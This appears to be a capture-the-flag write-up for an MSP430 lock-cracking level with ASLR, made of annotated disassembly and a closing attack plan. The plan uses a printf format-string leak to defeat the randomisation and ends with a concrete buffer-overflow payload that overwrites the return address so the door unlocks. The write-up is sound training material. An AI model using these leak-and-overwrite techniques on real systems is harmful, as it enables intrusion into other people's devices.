# First challenge with ASLR!!
0-4400 - stack (Starting at 4400 going down to 0)
4400-5400 - code

4438 <main>
## Store random at r11 (Code start address)
4438:  b012 1c4a      call	#0x4a1c <rand>
443c:  0b4f           mov	r15, r11
443e:  3bf0 fe7f      and	#0x7ffe, r11  // 011111111111110 - zero last and first bit
4442:  3b50 0060      add	#0x6000, r11  // Move to the ~middle of the address space
										  // r11 = (rand_1 ^ 011111111111110) + 0x6000
## Store random at r10
4446:  b012 1c4a      call	#0x4a1c <rand>
444a:  0a4f           mov	r15, r10	 // r10 = rand_2
## Copy the code to random address
444c:  3012 0010      push	#0x1000 // Length
4450:  3012 0044      push	#0x4400 // Stack init
4454:  0b12           push	r11		// Random addres
4456:  b012 e849      call	#0x49e8 <_memcpy>
445a:  3150 0600      add	#0x6, sp
## 
445e:  0f4a           mov	r10, r15
4460:  3ff0 fe0f      and	#0xffe, r15  // r15 = (rand_2 ^ 0000111111111110)
4464:  0e4b           mov	r11, r14    
4466:  0e8f           sub	r15, r14     // r14 = r11 - r15 = ((rand_1 ^ 011111111111110) + 0x6000) - (rand_2 ^ 0000111111111110)
4468:  3e50 00ff      add	#0xff00, r14 // r14 = ((rand_1 ^ 011111111111110) + 0x6000) - (rand_2 ^ 0000111111111110) + 0xff00
## Add 0x35c to the current code start
446c:  0d4b           mov	r11, r13
446e:  3d50 5c03      add	#0x35c, r13  // r13 = r11 + 0x35c
4472:  014e           mov	r14, sp      // sp = r14
4474:  0f4b           mov	r11, r15     // 
## r15 store the base offset, at this address is the end of the stack
4476:  8d12           call	r13          // call (r11 + 0x35c) --> Original address 0x475c = <aslr_main>

Code base at r11
Stack at "(rand_2 ^ 0000111111111110) + 0xff00" relative to code base and going upwords

475c <aslr_main>
475c:  0e4f           mov	r15, r14
475e:  3e50 8200      add	#0x82, r14 // r14 = r11 + 0x82 = 0x4482 -> _aslr_main
4762:  8e12           call	r14
4764:  32d0 f000      bis	#0xf0, sr
4768:  3041           ret
.
4482 <_aslr_main>
4482:  0b12           push	r11
4484:  0a12           push	r10
4486:  3182           sub	#0x8, sp      // Place allocated for the password
4488:  0c4f           mov	r15, r12
448a:  3c50 6a03      add	#0x36a, r12   // r12 = rand_base + 0x36a = 0x476a = printf address
448e:  814c 0200      mov	r12, 0x2(sp)
4492:  0e43           clr	r14
# memset(0x4400, 0x10000) (The original code)
	4494:  ce43 0044      mov.b	#0x0, 0x4400(r14)
	4498:  1e53           inc	r14
	449a:  3e90 0010      cmp	#0x1000, r14
	449e:  fa23           jnz	$-0xa <_aslr_main+0x12> // 0x4494
# Copy the string "Username (8 char max):" to 0x2402
	44a0:  f240 5500 0224 mov.b	#0x55, &0x2402
	44a6:  f240 7300 0324 mov.b	#0x73, &0x2403
	44ac:  f240 6500 0424 mov.b	#0x65, &0x2404
	44b2:  f240 7200 0524 mov.b	#0x72, &0x2405
	44b8:  f240 6e00 0624 mov.b	#0x6e, &0x2406
	44be:  f240 6100 0724 mov.b	#0x61, &0x2407
	44c4:  f240 6d00 0824 mov.b	#0x6d, &0x2408
	44ca:  f240 6500 0924 mov.b	#0x65, &0x2409
	44d0:  f240 2000 0a24 mov.b	#0x20, &0x240a
	44d6:  f240 2800 0b24 mov.b	#0x28, &0x240b
	44dc:  f240 3800 0c24 mov.b	#0x38, &0x240c
	44e2:  f240 2000 0d24 mov.b	#0x20, &0x240d
	44e8:  f240 6300 0e24 mov.b	#0x63, &0x240e
	44ee:  f240 6800 0f24 mov.b	#0x68, &0x240f
	44f4:  f240 6100 1024 mov.b	#0x61, &0x2410
	44fa:  f240 7200 1124 mov.b	#0x72, &0x2411
	4500:  f240 2000 1224 mov.b	#0x20, &0x2412
	4506:  f240 6d00 1324 mov.b	#0x6d, &0x2413
	450c:  f240 6100 1424 mov.b	#0x61, &0x2414
	4512:  f240 7800 1524 mov.b	#0x78, &0x2415
	4518:  f240 2900 1624 mov.b	#0x29, &0x2416
	451e:  f240 3a00 1724 mov.b	#0x3a, &0x2417
	4524:  c243 1824      mov.b	#0x0, &0x2418
	4528:  b240 1700 0024 mov	#0x17, &0x2400
	452e:  3e40 0224      mov	#0x2402, r14
# Print "Username (8 char max):"
	4532:  0b43           clr	r11
	4534:  103c           jmp	$+0x22 <_aslr_main+0xd4>
	4536:  1e53           inc	r14
	4538:  8d11           sxt	r13
	453a:  0b12           push	r11
	453c:  0d12           push	r13
	453e:  0b12           push	r11
	4540:  0012           push	pc
	4542:  0212           push	sr
	4544:  0f4b           mov	r11, r15
	4546:  8f10           swpb	r15
	4548:  024f           mov	r15, sr
	454a:  32d0 0080      bis	#0x8000, sr
	454e:  b012 1000      call	#0x10
	4552:  3241           pop	sr
	4554:  3152           add	#0x8, sp
	4556:  6d4e           mov.b	@r14, r13
	4558:  4d93           tst.b	r13
	455a:  ed23           jnz	$-0x24 <_aslr_main+0xb4>
# print '\n'
	455c:  0e43           clr	r14
	455e:  3d40 0a00      mov	#0xa, r13
	4562:  0e12           push	r14
	4564:  0d12           push	r13
	4566:  0e12           push	r14
	4568:  0012           push	pc
	456a:  0212           push	sr
	456c:  0f4e           mov	r14, r15
	456e:  8f10           swpb	r15
	4570:  024f           mov	r15, sr
	4572:  32d0 0080      bis	#0x8000, sr
	4576:  b012 1000      call	#0x10
	457a:  3241           pop	sr
	457c:  3152           add	#0x8, sp
# print '>'
	457e:  3d50 3400      add	#0x34, r13 // r13 = 0x3e
	4582:  0e12           push	r14
	4584:  0d12           push	r13
	4586:  0e12           push	r14
	4588:  0012           push	pc
	458a:  0212           push	sr
	458c:  0f4e           mov	r14, r15
	458e:  8f10           swpb	r15
	4590:  024f           mov	r15, sr
	4592:  32d0 0080      bis	#0x8000, sr
	4596:  b012 1000      call	#0x10
	459a:  3241           pop	sr
	459c:  3152           add	#0x8, sp
# print '>'
	459e:  0e12           push	r14
	45a0:  0d12           push	r13
	45a2:  0e12           push	r14
	45a4:  0012           push	pc
	45a6:  0212           push	sr
	45a8:  0f4e           mov	r14, r15
	45aa:  8f10           swpb	r15
	45ac:  024f           mov	r15, sr
	45ae:  32d0 0080      bis	#0x8000, sr
	45b2:  b012 1000      call	#0x10
	45b6:  3241           pop	sr
	45b8:  3152           add	#0x8, sp
# Getsn to 0x2426, length 0x08
	45ba:  3a42           mov	#0x8, r10
	45bc:  3b40 2624      mov	#0x2426, r11
	45c0:  2d43           mov	#0x2, r13
	45c2:  0a12           push	r10 // 0x8
	45c4:  0b12           push	r11 // 0x2426
	45c6:  0d12           push	r13 // 0x2
	45c8:  0012           push	pc  // pc
	45ca:  0212           push	sr  // poped later
	45cc:  0f4d           mov	r13, r15
	45ce:  8f10           swpb	r15
	45d0:  024f           mov	r15, sr
	45d2:  32d0 0080      bis	#0x8000, sr
	45d6:  b012 1000      call	#0x10
	45da:  3241           pop	sr
	45dc:  3152           add	#0x8, sp
# print the string entered in username, we can use %d %d %d to leak the stackk address
	45de:  c24e 2e24      mov.b	r14, &0x242e
	45e2:  0b12           push	r11 // overwrite the sr with 0x2426
	45e4:  8c12           call	r12 // Call printf
	45e6:  2153           incd	sp  // Current stack is 0x2426 -> pc -> 0x2 -> 0x2426 -> 0x8
# Zero the password until 0x2432 - 0x30 chars
	45e8:  0f4b           mov	r11, r15 // the password address - 0x2402
	45ea:  033c           jmp	$+0x8 <_aslr_main+0x170> // 0x45f2
	45ec:  cf43 0000      mov.b	#0x0, 0x0(r15)
	45f0:  1f53           inc	r15
	45f2:  3f90 3224      cmp	#0x2432, r15             // Zero the password until 0x2432 - 0x30 chars
	45f6:  fa23           jnz	$-0xa <_aslr_main+0x16a> // 0x45ec
# Copy the string "Password:" to 0x2402
	45f8:  f240 0a00 0224 mov.b	#0xa, &0x2402
	45fe:  f240 5000 0324 mov.b	#0x50, &0x2403
	4604:  f240 6100 0424 mov.b	#0x61, &0x2404
	460a:  f240 7300 0524 mov.b	#0x73, &0x2405
	4610:  f240 7300 0624 mov.b	#0x73, &0x2406
	4616:  f240 7700 0724 mov.b	#0x77, &0x2407
	461c:  f240 6f00 0824 mov.b	#0x6f, &0x2408
	4622:  f240 7200 0924 mov.b	#0x72, &0x2409
	4628:  f240 6400 0a24 mov.b	#0x64, &0x240a
	462e:  f240 3a00 0b24 mov.b	#0x3a, &0x240b
	4634:  c243 0c24      mov.b	#0x0, &0x240c
	4638:  3e40 0224      mov	#0x2402, r14
# print "Password:"
	463c:  0c43           clr	r12
	463e:  103c           jmp	$+0x22 <_aslr_main+0x1de> // 0x4660
	4640:  1e53           inc	r14
	4642:  8d11           sxt	r13
	4644:  0c12           push	r12
	4646:  0d12           push	r13
	4648:  0c12           push	r12
	464a:  0012           push	pc
	464c:  0212           push	sr
	464e:  0f4c           mov	r12, r15
	4650:  8f10           swpb	r15
	4652:  024f           mov	r15, sr
	4654:  32d0 0080      bis	#0x8000, sr
	4658:  b012 1000      call	#0x10
	465c:  3241           pop	sr
	465e:  3152           add	#0x8, sp
	4660:  6d4e           mov.b	@r14, r13
	4662:  4d93           tst.b	r13
	4664:  ed23           jnz	$-0x24 <_aslr_main+0x1be>
# print '\n'
	4666:  0e43           clr	r14
	4668:  3d40 0a00      mov	#0xa, r13
	466c:  0e12           push	r14
	466e:  0d12           push	r13
	4670:  0e12           push	r14
	4672:  0012           push	pc
	4674:  0212           push	sr
	4676:  0f4e           mov	r14, r15
	4678:  8f10           swpb	r15
	467a:  024f           mov	r15, sr
	467c:  32d0 0080      bis	#0x8000, sr
	4680:  b012 1000      call	#0x10
	4684:  3241           pop	sr
	4686:  3152           add	#0x8, sp
# Getsn to the stack + 0x4, length 0x14 (20)
	4688:  0b41           mov	sp, r11
	468a:  2b52           add	#0x4, r11
	468c:  3c40 1400      mov	#0x14, r12
	4690:  2d43           mov	#0x2, r13
	4692:  0c12           push	r12
	4694:  0b12           push	r11
	4696:  0d12           push	r13
	4698:  0012           push	pc
	469a:  0212           push	sr
	469c:  0f4d           mov	r13, r15
	469e:  8f10           swpb	r15
	46a0:  024f           mov	r15, sr
	46a2:  32d0 0080      bis	#0x8000, sr
	46a6:  b012 1000      call	#0x10
	46aa:  3241           pop	sr
	46ac:  3152           add	#0x8, sp
# Call hsm-2 test and unlock
	46ae:  3d50 7c00      add	#0x7c, r13 // 0x7e - HSM
	46b2:  0c41           mov	sp, r12
	46b4:  0c12           push	r12
	46b6:  0b12           push	r11
	46b8:  0d12           push	r13
	46ba:  0012           push	pc
	46bc:  0212           push	sr
	46be:  0f4d           mov	r13, r15
	46c0:  8f10           swpb	r15
	46c2:  024f           mov	r15, sr
	46c4:  32d0 0080      bis	#0x8000, sr
	46c8:  b012 1000      call	#0x10
	46cc:  3241           pop	sr
	46ce:  3152           add	#0x8, sp
# Copy the string "Wrong!" to 0x2402
	46d0:  f240 5700 0224 mov.b	#0x57, &0x2402
	46d6:  f240 7200 0324 mov.b	#0x72, &0x2403
	46dc:  f240 6f00 0424 mov.b	#0x6f, &0x2404
	46e2:  f240 6e00 0524 mov.b	#0x6e, &0x2405
	46e8:  f240 6700 0624 mov.b	#0x67, &0x2406
	46ee:  f240 2100 0724 mov.b	#0x21, &0x2407
	46f4:  c24e 0824      mov.b	r14, &0x2408
	46f8:  b240 0700 0024 mov	#0x7, &0x2400
# Print "Wrong!"
	46fe:  3d40 0224      mov	#0x2402, r13
	4702:  103c           jmp	$+0x22 <_aslr_main+0x2a2> // 0x4724
	4704:  1d53           inc	r13
	4706:  8c11           sxt	r12
	4708:  0e12           push	r14
	470a:  0c12           push	r12
	470c:  0e12           push	r14
	470e:  0012           push	pc
	4710:  0212           push	sr
	4712:  0f4e           mov	r14, r15
	4714:  8f10           swpb	r15
	4716:  024f           mov	r15, sr
	4718:  32d0 0080      bis	#0x8000, sr
	471c:  b012 1000      call	#0x10
	4720:  3241           pop	sr
	4722:  3152           add	#0x8, sp
	4724:  6c4d           mov.b	@r13, r12
	4726:  4c93           tst.b	r12
	4728:  ed23           jnz	$-0x24 <_aslr_main+0x282> // 0x4704
# Print '\n'
	472a:  0e43           clr	r14
	472c:  3d40 0a00      mov	#0xa, r13
	4730:  0e12           push	r14
	4732:  0d12           push	r13
	4734:  0e12           push	r14
	4736:  0012           push	pc
	4738:  0212           push	sr
	473a:  0f4e           mov	r14, r15
	473c:  8f10           swpb	r15
	473e:  024f           mov	r15, sr
	4740:  32d0 0080      bis	#0x8000, sr
	4744:  b012 1000      call	#0x10
	4748:  3241           pop	sr
	474a:  3152           add	#0x8, sp
474c:  0e41           mov	sp, r14
474e:  2e53           incd	r14
4750:  0e12           push	r14
4752:  3f41           pop	r15
4754:  3152           add	#0x8, sp
4756:  3a41           pop	r10
4758:  3b41           pop	r11
475a:  3041           ret

## Attack strategy
1. Leak aslr stack new address using printf, Username: %x%x%x%x
	Example result of the given username is:
		-> 00008ba800000000 8ba8
		The content of this address is:
		8ba0: 8e12 32d0 f000 3041 0b12 0a12 0912 0812   ..2...0A........45e6
		Disasembling this data point to:
			push	r11
			push	r10
			push	r9
			push	r8
		Which look exactly like the start of printf which originaly at 0x476a
		Inside printf it call to putchar and that why the printf address is above in the stack
		Using this address we can calculate the code base address and jump relative to it
2. overflow the stack using the password: Write the <INT> to the return address and then 0x7f for unlocking the door
		<INT> original address is 0x48ec so the new address is [0x48ec + (Leaked address - 0x476a)]
leaked = 0xafa4
hex(0x48ec + (leaked - 0x476a))
	0xb126
4141 4141 4141 4141 res 4141 7f00
4141 4141 4141 4141 26b1 4141 7f00

?? The code looks like it use only 4 byte pass length but we overwrite with 8
## // Attack strategy

49e8 <_memcpy>
49e8:  1c41 0600      mov	0x6(sp), r12
49ec:  0f43           clr	r15
49ee:  093c           jmp	$+0x14 <_memcpy+0x1a> // Jump to 0x4a02
49f0:  1e41 0200      mov	0x2(sp), r14
49f4:  0e5f           add	r15, r14
49f6:  1d41 0400      mov	0x4(sp), r13
49fa:  0d5f           add	r15, r13
## Loop - r15 is index, r12 is length (0x100), r14 is dest
49fc:  ee4d 0000      mov.b	@r13, 0x0(r14)
4a00:  1f53           inc	r15
4a02:  0f9c           cmp	r12, r15
4a04:  f523           jnz	$-0x14 <_memcpy+0x8>
4a06:  3041           ret
